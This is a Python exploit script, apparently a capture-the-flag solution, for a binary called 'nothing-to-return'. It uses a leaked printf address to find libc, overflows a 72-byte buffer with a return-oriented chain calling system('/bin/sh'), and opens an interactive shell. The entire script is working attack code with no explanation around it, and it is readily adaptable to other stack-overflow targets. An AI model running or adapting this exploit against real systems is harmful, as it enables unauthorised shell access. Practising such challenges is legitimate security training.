#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./nothing-to-return")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.recvuntil(b"printf is at ")
    libc.base = int(io.recvline().strip(b"\n"), 16) - unwrap(libc.symbol("printf"))

    io.sendlineafter(b"size:\n", b"500")

    payload = b""
    payload += b"A" * 72
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\0")))
    payload += ptr.p64(unwrap(libc.symbol("system")))

    io.sendlineafter(b"input:\n", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
